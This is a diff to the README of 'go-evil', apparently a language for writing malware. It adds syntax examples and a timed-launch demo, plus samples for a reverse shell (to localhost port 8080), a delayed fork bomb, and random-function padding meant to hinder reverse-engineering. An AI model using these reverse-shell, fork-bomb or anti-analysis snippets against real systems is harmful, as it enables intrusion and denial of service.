@@ -13,6 +13,16 @@
       * [Locally](#Locally)
    * [Anatomy of a go-evil based malware](#anatomy-of-a-go-evil-based-malware)
    * [Examples](#Examples)
+        * [Hello world](#Hello-world)
+        * [If/else statements](#If/else-statements)
+        * [Foreach](#Foreach)
+        * [Generating 32 random functions](#Generating-32-random-functions)
+        * [Wait until](#Wait-until)
+        * [Connecting a javascript button to a call function](#Connecting-a-javascript-button-to-a-call-function)
+        * [Reverse shell](#Reverse-shell)
+        * [Fork bomb](#Fork-bomb)
+
+
    * [Documentation](#Documentation)
    * [Legal notice](#legal-notice)
 
@@ -84,7 +94,7 @@ func main(){
 ```
 
 ## Examples
-In this example I will show you how you print messages to the CLI.
+### Hello world
 ```
 @ Showcases how you print a message @
 
@@ -109,7 +119,129 @@ l main_func {
 }
 ```
 
-This example shows how you can bind evil functions to javascript functions
+### If/else statements
+```
+@ Showcases how an if/else statement looks like @
+@ The allowed operators are... @
+@ > - larger @
+@ < - smaller @
+@ == - equals @
+@ != - does not equal @
+@ >= - larger or equals @
+@ <= - smaller or equals @
+
+use system
+use self
+
+[
+    version 2.0
+    output if_else
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+
+l main_func {
+   
+    if(${"1", ">", "2"}$):
+        system::outln("1 is bigger than 2")
+    else:
+        system::outln("1 is smaller than 2")
+    end if
+
+    system::exit("0")
+}
+```
+### Foreach
+```
+@ Showcases how a for-loop/foreach-loop works @
+
+use system
+
+[
+    version 2.0
+    output foreach
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+
+l main_func {
+    foreach(${"1","2","3","4","5"}$):
+        system::outln("€13€") @ The index €13€ is configured to only be used by foreach loops @
+    end foreach
+    
+    system::exit("0")
+}
+```
+
+### Generating 32 random functions
+```
+@ This example shows that go-evil v2 has the ability to add an n amount of @
+@ random function to your source code, which can act like a padding @
+@ but can also act like a factor to make it harder to reverse-engineer @
+
+use system
+use self
+
+[
+    version 2.0
+    output random_func
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+
+l main_func {
+    self::add_random_func("32") @ Adds 32 randomly definied functions to the src code @
+    system::outln("The definied functions don't effect the program itself, but sure as hell padds out the binary file")
+    system::outln("Compile with the debug flag to see the result")
+
+    system::exit("0")
+}
+
+```
+
+### Wait until
+```
+@ Shows the until function in the time domain @
+@ Supported formats @
+@ - YYYY/MM/DD-hh:mm @ 
+@ - hh:mm @
+
+use system
+use time
+
+[
+    version 2.0
+    output until
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+l main_func {
+    time::until("10:45") @ The program will launch after 10:45 @
+    system::outln("Hello I've launched!!")
+    
+    system::outln("Let us try this again!!")
+    
+    time::until("2023/04/09-10:50")
+    system::outln("Finishing up!")
+
+    system::exit("0")
+}
+```
+
+
+### Connecting a javascript button to a call function
 ```
 @ Showcasing how you can bind an evil function to a javascript call @
 
@@ -144,8 +276,63 @@ l loop {
     system::exit("0")
 }
 ```
+
 Running the code above will result in the following
 ![image](https://user-images.githubusercontent.com/14398606/189844664-0d870f9a-4a27-401f-a6ec-619fb8556cd4.png)
+
+### Reverse shell
+```
+@ Performs a reverse shell back to the attacker @
+@ To check if the reverse shell works, run the following nc -l 8080 @
+
+use system
+use network
+
+[
+    version 2.0
+    output reverse_shell
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+
+l main_func {
+    network::reverse_shell(${"127.0.0.1", "8080"}$)
+
+    system::exit("0")
+}
+```
+
+### Fork bomb
+```
+@ Executes a fork bomb @
+
+use system
+use bombs
+use time
+
+[
+    version 2.0
+    output fork_bomb
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+c executioner -> boolean { @ When this function returns, the bomb is executed @
+    system::outln("I'm the bomb!")
+    time::sleep("600") @ Sleep for 10 minutes before returning @
+}
+
+l main_func {
+    system::outln("Warning: Do not try this on your own machine!")
+    bombs::fork_bomb(${"500", "executioner"}$) @ 500 ms until it blows up @
+    system::exit("0")
+}
+```
 
 ## Documentation
 There is no wiki page as each function/object have a corresponding example file under `examples/<domain>/`. <br/>
